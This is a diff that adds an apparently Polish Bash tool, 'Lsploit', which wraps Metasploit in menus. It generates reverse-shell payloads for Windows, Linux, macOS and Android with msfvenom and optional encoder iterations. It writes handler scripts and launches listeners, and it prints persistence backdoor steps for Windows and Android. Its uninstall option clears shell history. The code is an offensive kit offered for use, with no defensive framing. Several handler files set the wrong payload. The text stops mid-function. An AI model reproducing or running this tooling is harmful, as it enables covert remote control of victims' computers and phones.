@@ -1,0 +1,1150 @@
+#!/bin/bash
+# LSPLOIT v1.2 by LYSYyy
+
+version="1.2"
+
+
+# LOGO #
+
+function logo 
+{
+clear
+echo
+echo -e "\e[1;32m ___      _______  _______  ___      _______  ___   _______ "
+echo "|   |    |       ||       ||   |    |       ||   | |       |"
+echo "|   |    |  _____||    _  ||   |    |   _   ||   | |_     _|"
+echo "|   |    | |_____ |   |_| ||   |    |  | |  ||   |   |   |  "
+echo "|   |___ |_____  ||    ___||   |___ |  |_|  ||   |   |   |  "
+echo "|       | _____| ||   |    |       ||       ||   |   |   |  "
+echo "|_______||_______||___|    |_______||_______||___|   |___|  "
+echo
+echo -e "                   \e[1;93mLsploit v$version by LYSYyy\e[0m             "
+echo
+}
+
+function server
+{
+	echo
+	echo -e " \e[1;32m[+]\e[1;39m Trwa uruchamianie...\e[0m"
+	echo
+	service postgresql start
+	service metasploit start
+	clear
+}
+
+function bd_exploit
+{
+	logo
+	echo -e "\e[1;32mProsze wybrac OS:\e[39m"
+	echo
+	echo -e " \e[93m[1]\e[39m - Windows"
+	echo -e " \e[93m[2]\e[39m - Linux"
+	echo -e " \e[93m[3]\e[39m - MAC"
+	echo -e " \e[93m[4]\e[39m - Android"
+	echo
+	echo -e " \e[1;31m[0]\e[39m - Powrot\e[0m"
+	echo
+	echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+	read -e bd_os
+	
+	if [ $bd_os = "1" ]; then
+		logo
+		echo -e "                 \e[1;31mWINDOWS BACKDOOR GENERATOR\e[0m"
+		echo
+		echo -ne "\e[36mProsze podac LHOST:\e[1;39m "
+		read -e bd_lhost
+		echo -ne "\e[21;36mProsze podac LPORT:\e[1;39m "
+		read -e bd_lport
+		echo -ne "\e[21;36mProsze wpisac czas odswiezania (s):\e[1;39m "
+		read -e bd_time
+		logo
+		echo -e "                 \e[1;31mWINDOWS BACKDOOR GENERATOR\e[0m"
+		echo
+		echo -e "    \e[1mrun persistence -X -U -i $bd_time -p $bd_lport -r $bd_lhost\e[0m"
+		echo
+		read
+		menu
+
+	elif [ $bd_os = "2" ]; then
+		logo
+		echo
+		echo -e " \e[1;31m[+]\e[1;39m Aktualnie funkcja ta jest jeszcze nie dostepna!\e[0m"
+		echo
+		read
+		menu
+
+	elif [ $bd_os = "3" ]; then
+		logo
+		echo
+		echo -e " \e[1;31m[+]\e[1;39m Aktualnie funkcja ta jest jeszcze nie dostepna!\e[0m"
+		echo
+		read
+		menu
+
+	elif [ $bd_os = "4" ]; then
+		rm ~/.lsploit/backdoor.sh
+		logo
+		echo -e "                 \e[1;31mANDROID BACKDOOR GENERATOR\e[0m"
+		echo
+		echo -ne "\e[21;36mProsze wpisac czas odswiezania (s):\e[1;39m "
+		read -e bd_time
+
+		touch ~/.lsploit/backdoor.sh
+           	echo \#\!/bin/bash >> ~/.lsploit/backdoor.sh
+            	echo while : >> ~/.lsploit/backdoor.sh
+            	echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/.lsploit/backdoor.sh
+            	echo sleep $bd_time >> ~/.lsploit/backdoor.sh
+            	echo done >> ~/.lsploit/backdoor.sh
+            	cat ~/.lsploit/backdoor.sh
+
+		logo
+		echo -e "                 \e[1;31mANDROID BACKDOOR GENERATOR\e[0m"
+		echo
+            	echo -e " \e[1;32m[+]\e[1;39m Skrypt zostal zapiany w: '\e[31m~/.lsploit/\e[0m'\e[0m" 
+		echo 
+		echo -e " \e[1;36m1.\e[39m cd /sdcard/Download"
+		echo -e " \e[1;36m2.\e[39m upload ~/.lsploit/backdoor.sh"
+		echo -e " \e[1;36m3.\e[39m shell"
+		echo -e " \e[1;36m4.\e[39m cd /sdcard/Download"
+		echo -e " \e[1;36m5.\e[39m sh backdoor.sh\e[0m"
+		echo
+		read
+		menu
+
+	elif [ $bd_os = "0" ]; then
+		menu
+
+	else
+		echo
+		echo -e "\e[1;91mWybrano nieprawidłową opcje OS!\e[0m" 
+		echo
+		read
+		bd_exploit
+	fi
+}
+
+function zaawansowane
+{
+	clear
+	logo
+	echo -e " \e[1;95m[1]\e[39m - Usuwanie plikow wybranego exploit'a (\e[31m'~/.lsploit/'\e[0m)"
+	echo -e " \e[1;95m[2]\e[39m - Usuwanie plikow (\e[31m'~/.lsploit/'\e[39m)\e[0m"
+	echo -e " \e[1;95m[3]\e[39m - Aktualizacja"
+	echo -e " \e[1;95m[4]\e[39m - Usuwanie Lsploit'a"
+	echo
+	echo -e " \e[1;31m[0]\e[39m - Powrot\e[0m"
+	echo
+	echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+	read -e zopcja
+	
+	if [ $zopcja = "1" ]; then
+		logo
+		echo -ne "\e[95mProsze podac nazwe exploit'a:\e[1;39m "
+		read -e ename
+		
+		if [ -e ~/.lsploit/$ename.rc ]; then
+			rm ~/.lsploit/$ename*
+			logo
+			echo -e " \e[1;31m[+]\e[1;39m Pliki '\e[31m$ename\e[39m' zostaly usuniete!\e[0m"
+			echo
+			read
+			zaawansowane
+		
+		else
+			logo
+			echo -e "\e[1;31mPodana nazwa nie zostala znaleziona!\e[0m"
+			echo
+			read
+			zaawansowane
+		fi
+		
+	elif [ $zopcja = "2" ]; then
+		rm -r ~/.lsploit/*
+		logo
+		echo -e " \e[1;31m[+]\e[1;39m Zawartosc \e[31m'~/.lsploit/'\e[39m zostala usunieta!\e[0m"
+		echo
+		read
+		zaawansowane
+		
+	elif [ $zopcja = "3" ]; then
+		logo
+		echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam aktualizacje...\e[90m"
+		echo
+		rm -r /Lsploit
+		cd /
+		git clone https://github.com/LYSYyy/Lsploit.git
+		cd /Lsploit
+		chmod 755 setup.sh
+		echo -e "\e[0m"
+		./setup.sh
+		exit
+		
+	elif [ $zopcja = "4" ]; then
+		logo
+		echo -e "\e[1;95mCzy na pewno chcesz odinstalowac program Lsploit? [T / N]"
+		echo
+		echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+		read -e uninstall
+		
+		if [ $uninstall = "T" ]; then
+			logo
+			rm -r ~/.lsploit
+			rm /bin/lsploit
+			history -c
+			echo -e " \e[1;31m[+]\e[1;39m Program \e[93mLsploit\e[39m zostal odinstalowany wraz z zawartoscia!\e[0m"
+			echo
+			read
+			exit
+			
+		elif [ $uninstall = "t" ]; then
+			logo
+			rm -r ~/.lsploit
+			rm /bin/lsploit
+			history -c
+			echo -e " \e[1;31m[+]\e[1;39m Program \e[93mLsploit\e[39m zostal odinstalowany wraz z zawartoscia!\e[0m"
+			echo
+			read
+			exit
+			
+		elif [ $uninstall = "N" ]; then
+			zaawansowane
+			
+		elif [ $uninstall = "n" ]; then
+			zaawansowane
+			
+		else
+			echo
+			echo -e "\e[1;91mWybrano nieprawidlowa opcje!\e[0m"
+			echo
+			read
+			zaawansowane
+		fi
+		
+	elif [ $zopcja = "0" ]; then
+		menu
+	
+	else
+		echo
+		echo -e "\e[1;91mWybrano nieprawidlowa opcje!\e[0m"
+		echo
+		read
+		zaawansowane
+	fi
+}
+
+function connect_exploit
+{
+	clear
+	logo
+	echo -e " \e[1;32m[1]\e[39m - Wczytanie pliku rc"
+	echo -e " \e[1;32m[2]\e[39m - Wczytanie sesji MFC"
+	echo -e " \e[1;32m[3]\e[39m - Reczne wprowadzanie danych"
+	echo
+	echo -e " \e[1;31m[0]\e[39m - Powrot\e[0m"
+	echo
+	echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+	read -e copcja
+	
+	if [ $copcja = "1" ]; then
+		clear
+		logo
+		echo -ne "\e[36mProsze podac pelna sciezke do pliku rc:\e[1;39m "
+		read -e path
+		clear
+		echo
+		echo -e "  \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+		msfconsole -q -r $path
+		menu
+		
+	elif [ $copcja = "2" ]; then
+		clear
+		logo
+		echo -ne "\e[36mProsze podac nazwe sesji MFC:\e[1;39m "
+		read -e sesja
+		echo
+		mfc -c $sesja
+		menu
+	
+	elif [ $copcja = "3" ]; then
+
+		clear
+		logo
+		echo -ne "\e[36mProsze podac LHOST:\e[1;39m "
+		read -e lhostc
+		echo -ne "\e[21;36mProsze podac LPORT:\e[1;39m "
+		read -e lportc
+		echo -ne "\e[21;36mProsze podac PAYLOAD:\e[1;39m "
+		read -e payload
+		
+		echo
+		echo -e "  \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+		echo
+		
+		touch ~/.lsploit/$lhostc.rc
+		echo use exploit/multi/handler > ~/.lsploit/$lhostc.rc
+        echo set PAYLOAD $payload >> ~/.lsploit/$lhostc.rc
+        echo set LHOST $lhost >> ~/.lsploit/$lhostc.rc
+        echo set LPORT $lport >> ~/.lsploit/$lhostc.rc
+        echo set ExitOnSession false >> ~/.lsploit/$lhostc.rc
+        echo exploit -j >> ~/.lsploit/$lhostc.rc
+        
+        msfconsole -q -r ~/.lsploit/$lhostc.rc
+        
+        rm ~/.lsploit/$lhostc.rc
+        
+        menu
+	
+    elif [ $copcja = "0" ]; then
+    	menu
+        
+    else
+		echo
+		echo -e "\e[1;91mWybrano nieprawidłową opcje!\e[0m"
+		echo
+		read
+		connect_exploit
+	fi
+}
+
+function win86
+{
+	clear
+	echo
+	echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam tworzenie exploit'a...\e[1;90m"
+	echo
+	
+	if [ -e ~/.lsploit ]; then
+		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform=windows --arch=x86 -f exe > ~/.lsploit/$name.exe
+		touch ~/.lsploit/$name.rc
+       	echo use exploit/multi/handler > ~/.lsploit/$name.rc
+        echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/.lsploit/$name.rc
+        echo set LHOST $lhost >> ~/.lsploit/$name.rc
+        echo set LPORT $lport >> ~/.lsploit/$name.rc
+        echo set ExitOnSession false >> ~/.lsploit/$name.rc
+        echo exploit -j >> ~/.lsploit/$name.rc
+        
+        clear
+        logo
+        echo -e " \e[1;32m[+]\e[1;39m Exploit zostal zapisany w: \e[31m'~/.lsploit/'\e[0m"
+        echo
+        echo -e "\e[1;32mCzy chcesz polaczyc sie z '\e[31m$name\e[32m'? [T / N]"
+        echo
+        echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+		read -e autoconnect
+        
+        if [ $autoconnect = "T" ]; then
+        	echo
+			echo -e "  \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "t" ]; then
+		    echo
+			echo -e "  \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "n" ]; then
+			menu
+		elif [ $autoconnect = "N" ]; then
+			menu
+		else
+			menu
+		fi
+	else
+		mkdir ~/.lsploit
+		win86
+	fi
+}
+
+function win64
+{
+	clear
+	echo
+	echo -e "  \e[1;32m[+]\e[1;39m Rozpoczynam tworzenie exploit'a...\e[1;90m"
+	echo
+	
+	if [ -e ~/.lsploit ]; then
+		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform=windows -f exe > ~/.lsploit/$name.exe
+		touch ~/.lsploit/$name.rc
+       	echo use exploit/multi/handler > ~/.lsploit/$name.rc
+        echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/.lsploit/$name.rc
+        echo set LHOST $lhost >> ~/.lsploit/$name.rc
+        echo set LPORT $lport >> ~/.lsploit/$name.rc
+        echo set ExitOnSession false >> ~/.lsploit/$name.rc
+        echo exploit -j >> ~/.lsploit/$name.rc
+        
+        clear
+        logo
+        echo -e " \e[1;32m[+]\e[1;39m Exploit zostal zapisany w: \e[31m'~/.lsploit/'\e[0m"
+        echo
+        echo -e "\e[1;32mCzy chcesz polaczyc sie z '\e[31m$name\e[32m'? [T / N]"
+        echo
+        echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+		read -e autoconnect
+        
+        if [ $autoconnect = "T" ]; then
+			echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "t" ]; then
+			echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "n" ]; then
+			menu
+		elif [ $autoconnect = "N" ]; then
+			menu
+		else
+			menu
+		fi
+	else
+		mkdir ~/.lsploit
+		win64
+	fi
+}
+
+function linux
+{
+	clear
+	echo
+	echo -e "  \e[1;32m[+]\e[1;39m Rozpoczynam tworzenie exploit'a...\e[1;90m"
+	echo
+	
+	if [ -e ~/.lsploit ]; then
+		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > ~/.lsploit/$name.elf
+		touch ~/.lsploit/$name.rc
+       	echo use exploit/multi/handler > ~/.lsploit/$name.rc
+        echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/.lsploit/$name.rc
+        echo set LHOST $lhost >> ~/.lsploit/$name.rc
+        echo set LPORT $lport >> ~/.lsploit/$name.rc
+        echo set ExitOnSession false >> ~/.lsploit/$name.rc
+        echo exploit -j >> ~/.lsploit/$name.rc
+        
+        clear
+        logo
+        echo -e " \e[1;32m[+]\e[1;39m Exploit zostal zapisany w: \e[31m'~/.lsploit/'\e[0m"
+        echo
+        echo -e "\e[1;32mCzy chcesz polaczyc sie z '\e[31m$name\e[32m'? [T / N]"
+        echo
+        echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+		read -e autoconnect
+        
+        if [ $autoconnect = "T" ]; then
+        	echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "t" ]; then
+			echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "n" ]; then
+			menu
+		elif [ $autoconnect = "N" ]; then
+			menu
+		else
+			menu
+		fi
+	else
+		mkdir ~/.lsploit
+		linux
+	fi
+}
+
+function mac
+{
+	clear
+	echo
+	echo -e "  \e[1;32m[+]\e[1;39m Rozpoczynam tworzenie exploit'a...\e[1;90m"
+	echo
+	
+	if [ -e ~/.lsploit ]; then
+		msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > ~/.lsploit/$name.macho
+		touch ~/.lsploit/$name.rc
+       	echo use exploit/multi/handler > ~/.lsploit/$name.rc
+        echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/.lsploit/$name.rc
+        echo set LHOST $lhost >> ~/.lsploit/$name.rc
+        echo set LPORT $lport >> ~/.lsploit/$name.rc
+        echo set ExitOnSession false >> ~/.lsploit/$name.rc
+        echo exploit -j >> ~/.lsploit/$name.rc
+        
+        clear
+        logo
+        echo -e " \e[1;32m[+]\e[1;39m Exploit zostal zapisany w: \e[31m'~/.lsploit/'\e[0m"
+        echo
+        echo -e "\e[1;32mCzy chcesz polaczyc sie z '\e[31m$name\e[32m'? [T / N]"
+        echo
+        echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+		read -e autoconnect
+        
+        if [ $autoconnect = "T" ]; then
+        	echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "t" ]; then
+			echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "n" ]; then
+			menu
+		elif [ $autoconnect = "N" ]; then
+			menu
+		else
+			menu
+		fi
+	else
+		mkdir ~/.lsploit
+		linux
+	fi
+}
+
+function android
+{
+	clear
+	echo
+	echo -e "  \e[1;32m[+]\e[1;39m Rozpoczynam tworzenie exploit'a...\e[1;90m"
+	echo
+	
+	if [ -e ~/.lsploit ]; then
+		msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > ~/.lsploit/$name.apk
+		touch ~/.lsploit/$name.rc
+       	echo use exploit/multi/handler > ~/.lsploit/$name.rc
+        echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/.lsploit/$name.rc
+        echo set LHOST $lhost >> ~/.lsploit/$name.rc
+        echo set LPORT $lport >> ~/.lsploit/$name.rc
+        echo set ExitOnSession false >> ~/.lsploit/$name.rc
+        echo exploit -j >> ~/.lsploit/$name.rc
+        
+        clear
+        logo
+        echo -e " \e[1;32m[+]\e[1;39m Exploit zostal zapisany w: \e[31m'~/.lsploit/'\e[0m"
+        echo
+        echo -e "\e[1;32mCzy chcesz polaczyc sie z '\e[31m$name\e[32m'? [T / N]"
+        echo
+        echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+		read -e autoconnect
+        
+        if [ $autoconnect = "T" ]; then
+        	echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "t" ]; then
+			echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "n" ]; then
+			menu
+		elif [ $autoconnect = "N" ]; then
+			menu
+		else
+			menu
+		fi
+	else
+		mkdir ~/.lsploit
+		linux
+	fi
+}
+
+function win86c
+{
+	clear
+	echo
+	echo -e "  \e[1;32m[+]\e[1;39m Rozpoczynam tworzenie exploit'a...\e[1;90m"
+	echo
+	
+	if [ -e ~/.lsploit ]; then
+		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform=windows --arch=x86 -e $encoder -i $iteracje -f exe > ~/.lsploit/$name.exe
+		touch ~/.lsploit/$name.rc
+       	echo use exploit/multi/handler > ~/.lsploit/$name.rc
+        echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/.lsploit/$name.rc
+        echo set LHOST $lhost >> ~/.lsploit/$name.rc
+        echo set LPORT $lport >> ~/.lsploit/$name.rc
+        echo set ExitOnSession false >> ~/.lsploit/$name.rc
+        echo exploit -j >> ~/.lsploit/$name.rc
+        
+        clear
+        logo
+        echo -e " \e[1;32m[+]\e[1;39m Exploit zostal zapisany w: \e[31m'~/.lsploit/'\e[0m"
+        echo
+        echo -e "\e[1;32mCzy chcesz polaczyc sie z '\e[31m$name\e[32m'? [T / N]"
+        echo
+        echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+		read -e autoconnect
+        
+        if [ $autoconnect = "T" ]; then
+        	echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "t" ]; then
+			echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "n" ]; then
+			menu
+		elif [ $autoconnect = "N" ]; then
+			menu
+		else
+			menu
+		fi
+	else
+		mkdir ~/.lsploit
+		win86
+	fi
+}
+
+function win64c
+{
+	clear
+	echo
+	echo -e "  \e[1;32m[+]\e[1;39m Rozpoczynam tworzenie exploit'a...\e[1;90m"
+	echo
+	
+	if [ -e ~/.lsploit ]; then
+		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform=windows -e $encoder -i $iteracje -f exe > ~/.lsploit/$name.exe
+		touch ~/.lsploit/$name.rc
+       	echo use exploit/multi/handler > ~/.lsploit/$name.rc
+        echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/.lsploit/$name.rc
+        echo set LHOST $lhost >> ~/.lsploit/$name.rc
+        echo set LPORT $lport >> ~/.lsploit/$name.rc
+        echo set ExitOnSession false >> ~/.lsploit/$name.rc
+        echo exploit -j >> ~/.lsploit/$name.rc
+        
+        clear
+        logo
+        echo -e " \e[1;32m[+]\e[1;39m Exploit zostal zapisany w: \e[31m'~/.lsploit/'\e[0m"
+        echo
+        echo -e "\e[1;32mCzy chcesz polaczyc sie z '\e[31m$name\e[32m'? [T / N]"
+        echo
+        echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+		read -e autoconnect
+        
+        if [ $autoconnect = "T" ]; then
+        	echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "t" ]; then
+			echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "n" ]; then
+			menu
+		elif [ $autoconnect = "N" ]; then
+			menu
+		else
+			menu
+		fi
+	else
+		mkdir ~/.lsploit
+		win64
+	fi
+}
+
+function linuxc
+{
+	clear
+	echo
+	echo -e "  \e[1;32m[+]\e[1;39m Rozpoczynam tworzenie exploit'a...\e[1;90m"
+	echo
+	
+	if [ -e ~/.lsploit ]; then
+		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e $encoder -i $iteracje -f elf > ~/.lsploit/$name.elf
+		touch ~/.lsploit/$name.rc
+       	echo use exploit/multi/handler > ~/.lsploit/$name.rc
+        echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/.lsploit/$name.rc
+        echo set LHOST $lhost >> ~/.lsploit/$name.rc
+        echo set LPORT $lport >> ~/.lsploit/$name.rc
+        echo set ExitOnSession false >> ~/.lsploit/$name.rc
+        echo exploit -j >> ~/.lsploit/$name.rc
+        
+        clear
+        logo
+        echo -e " \e[1;32m[+]\e[1;39m Exploit zostal zapisany w: \e[31m'~/.lsploit/'\e[0m"
+        echo
+        echo -e "\e[1;32mCzy chcesz polaczyc sie z '\e[31m$name\e[32m'? [T / N]"
+        echo
+        echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+		read -e autoconnect
+        
+        if [ $autoconnect = "T" ]; then
+        	echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "t" ]; then
+			echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "n" ]; then
+			menu
+		elif [ $autoconnect = "N" ]; then
+			menu
+		else
+			menu
+		fi
+	else
+		mkdir ~/.lsploit
+		linux
+	fi
+}
+
+function macc
+{
+	clear
+	echo
+	echo -e "  \e[1;32m[+]\e[1;39m Rozpoczynam tworzenie exploit'a...\e[1;90m"
+	echo
+	
+	if [ -e ~/.lsploit ]; then
+		msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -e $encoder -i $iteracje -f macho > ~/.lsploit/$name.macho
+		touch ~/.lsploit/$name.rc
+       	echo use exploit/multi/handler > ~/.lsploit/$name.rc
+        echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/.lsploit/$name.rc
+        echo set LHOST $lhost >> ~/.lsploit/$name.rc
+        echo set LPORT $lport >> ~/.lsploit/$name.rc
+        echo set ExitOnSession false >> ~/.lsploit/$name.rc
+        echo exploit -j >> ~/.lsploit/$name.rc
+        
+        clear
+        logo
+        echo -e " \e[1;32m[+]\e[1;39m Exploit zostal zapisany w: \e[31m'~/.lsploit/'\e[0m"
+        echo
+        echo -e "\e[1;32mCzy chcesz polaczyc sie z '\e[31m$name\e[32m'? [T / N]"
+        echo
+        echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+		read -e autoconnect
+        
+        if [ $autoconnect = "T" ]; then
+        	echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "t" ]; then
+			echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "n" ]; then
+			menu
+		elif [ $autoconnect = "N" ]; then
+			menu
+		else
+			menu
+		fi
+	else
+		mkdir ~/.lsploit
+		linux
+	fi
+}
+
+function androidc
+{
+	clear
+	echo
+	echo -e "  \e[1;32m[+]\e[1;39m Rozpoczynam tworzenie exploit'a...\e[1;90m"
+	echo
+	
+	if [ -e ~/.lsploit ]; then
+		msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e $encoder -i $iteracje R > ~/.lsploit/$name.apk
+		touch ~/.lsploit/$name.rc
+       	echo use exploit/multi/handler > ~/.lsploit/$name.rc
+        echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/.lsploit/$name.rc
+        echo set LHOST $lhost >> ~/.lsploit/$name.rc
+        echo set LPORT $lport >> ~/.lsploit/$name.rc
+        echo set ExitOnSession false >> ~/.lsploit/$name.rc
+        echo exploit -j >> ~/.lsploit/$name.rc
+        
+        clear
+        logo
+        echo -e " \e[1;32m[+]\e[1;39m Exploit zostal zapisany w: \e[31m'~/.lsploit/'\e[0m"
+        echo
+        echo -e "\e[1;32mCzy chcesz polaczyc sie z '\e[31m$name\e[32m'? [T / N]"
+        echo
+        echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+		read -e autoconnect
+        
+        if [ $autoconnect = "T" ]; then
+        	echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "t" ]; then
+			echo
+			echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam polaczenie...\e[0m"
+			echo
+			msfconsole -q -r ~/.lsploit/$name.rc
+			menu
+		elif [ $autoconnect = "n" ]; then
+			menu
+		elif [ $autoconnect = "N" ]; then
+			menu
+		else
+			menu
+		fi
+	else
+		mkdir ~/.lsploit
+		linux
+	fi
+}
+
+function create_exploit
+{
+	xterm -geometry 80x20+1+300 -hold -e ifconfig &
+	logo
+	echo -ne "\e[1;32mProsze podac LHOST:\e[39m "
+	read -e lhost
+	killall xterm
+	echo -ne "\e[1;32mProsze podac LPORT:\e[39m "
+	read -e lport
+	
+	echo -e "\e[1;32mProsze wybrac OS:\e[39m"
+	echo
+	echo -e " \e[93m[1]\e[39m - Windows x86"
+	echo -e " \e[93m[2]\e[39m - Windows x64"
+	echo -e " \e[93m[3]\e[39m - Linux"
+	echo -e " \e[93m[4]\e[39m - MAC"
+	echo -e " \e[93m[5]\e[39m - Android"
+	echo
+	echo -e " \e[1;31m[0]\e[39m - Powrot\e[0m"
+	echo
+	echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+	read -e os
+	
+	if [ $os = "1" ]; then
+		osn="win86"
+	elif [ $os = "2" ]; then
+		osn="win64"
+	elif [ $os = "3" ]; then
+		osn="linux"
+	elif [ $os = "4" ]; then
+		osn="mac"
+	elif [ $os = "5" ]; then
+		osn="android"
+	elif [ $os = "0" ]; then
+		menu
+	else
+		echo
+		echo -e "\e[1;91mWybrano nieprawidłową opcje OS!\e[0m" 
+		echo
+		read
+		create_exploit
+	fi
+	
+	echo
+	echo -e "\e[1;32mCzy chcesz wykorzystac system \e[31mMSFencode\e[32m? [T / N]\e[39m"
+	echo
+	echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+	read -e coder
+	
+	if [ $coder = "T" ]; then
+		xterm -geometry 100x50+1+300 -hold -e msfvenom -l encoders &
+		echo
+		echo -ne "\e[1;32mProsze podac nazwe szyfrowania:\e[39m "
+		read -e encoder
+		killall xterm
+		echo
+		echo -ne "\e[1;32mProsze podac liczbe iteracji szyfrowania:\e[39m "
+		read -e iteracje
+
+		echo
+		echo -ne "\e[1;32mProsze podac nazwe exploit'a:\e[39m "
+		read -e name
+		
+		clear
+		logo
+		
+		echo -e "                        \e[1;32mPODSUMOWANIE:\e[39m "
+		echo -e "                 --------------------------"
+		echo -e "                 Nazwa: '\e[31m$name\e[39m'"
+		echo -e "                 OS: '\e[31m$osn\e[39m'"
+		echo -e "                 LHOST: '\e[31m$lhost\e[39m'"
+		echo -e "                 LPORT: '\e[31m$lport\e[39m'"
+		echo -e "                 MSFencoder: '\e[31m$encoder (x$iteracje)\e[39m'"
+		echo -e "                 --------------------------"
+		echo
+		echo -e " \e[1;32m[+]\e[1;39m Jezeli wszystko sie zgadza wcisnij ENTER\e[0m"
+		read
+		echo
+		
+		if [ $os = "1" ]; then
+			win86c
+		elif [ $os = "2" ]; then
+			win64c
+		elif [ $os = "3" ]; then
+			linuxc
+		elif [ $os = "4" ]; then
+			macc
+		elif [ $os = "5" ]; then
+			androidc
+		else
+			echo
+			echo -e "\e[1;91mWybrano nieprawidłową opcje OS!\e[0m" 
+			echo
+			read
+			create_exploit
+		fi
+		
+	elif [ $coder = "t" ]; then
+		xterm -geometry 100x50+1+300 -hold -e msfvenom -l encoders &
+		echo
+		echo -ne "\e[1;32mProsze podac nazwe szyfrowania:\e[39m "
+		read -e encoder
+		killall xterm
+		echo
+		echo -ne "\e[1;32mProsze podac liczbe iteracji szyfrowania:\e[39m "
